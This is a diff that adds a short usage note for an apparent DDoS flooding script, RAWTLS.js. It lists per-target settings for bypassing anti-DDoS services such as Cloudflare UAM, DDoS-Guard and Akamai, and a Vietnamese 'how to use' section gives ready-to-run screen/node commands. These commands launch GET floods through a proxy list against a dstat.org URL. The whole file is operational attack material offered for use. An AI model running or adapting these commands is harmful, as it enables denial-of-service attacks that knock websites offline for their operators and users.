@@ -1,0 +1,12 @@
+
+50 BYPASS CF UAM
+40 DDoS-Guard
+100 sKY
+150 socket
+300 - 600 Bypass Akamai
+45 Bypass CF
+55 Bypass CF
+50-60  BlazingFlast
+CÁCH DÙNG: 
+screen -md node RAWTLS.js GET 50 http://cogentv2.dstat.org/ 10000 500 proxy.txt
+screen -md node RAWTLS.js GET Số ở trên http://cogentv2.dstat.org/ 10000 timeout proxy.txt
